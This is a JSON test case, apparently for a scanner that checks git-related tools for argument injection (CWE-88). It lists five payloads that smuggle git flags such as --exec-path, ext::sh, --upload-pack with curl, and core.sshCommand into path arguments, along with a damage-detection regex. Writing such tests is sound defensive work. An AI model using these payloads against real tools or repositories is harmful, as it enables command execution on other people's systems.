{
  "id": "git_argument_injection",
  "category": "C1",
  "subcategory": "argument_injection",
  "cwe": "CWE-88",
  "cvss_reference": "CVE-2025-68144",
  "description": "Inject git CLI flags into repository path or argument parameters. Unlike shell metachar injection, these use valid-looking flag syntax that bypasses naive input validation.",
  "match_rules": {
    "tool_name_contains": ["git", "repo", "commit", "diff", "clone", "init", "checkout", "branch", "log", "status"]
  },
  "payloads": [
    {"label": "exec_path_rce",   "value": "--exec-path=/tmp/evil"},
    {"label": "hook_path",       "value": "../../.git/hooks/pre-commit"},
    {"label": "ext_protocol",    "value": "-c protocol.ext.allow=always ext::sh -c id>/tmp/pwned"},
    {"label": "upload_pack_ssrf","value": "--upload-pack=curl${IFS}http://127.0.0.1/"},
    {"label": "config_override", "value": "--global core.sshCommand=id>/tmp/pwned2"}
  ],
  "benign_payload": ".",
  "expected_score_range": [7, 10],
  "expected_benign_range": [1, 3],
  "damage_indicator": "uid=|id=|pwned|executed|hook.*triggered|exec.path|error.*--exec|fatal.*upload.pack",
  "taxonomy_tier": 1,
  "observability": "low"
}
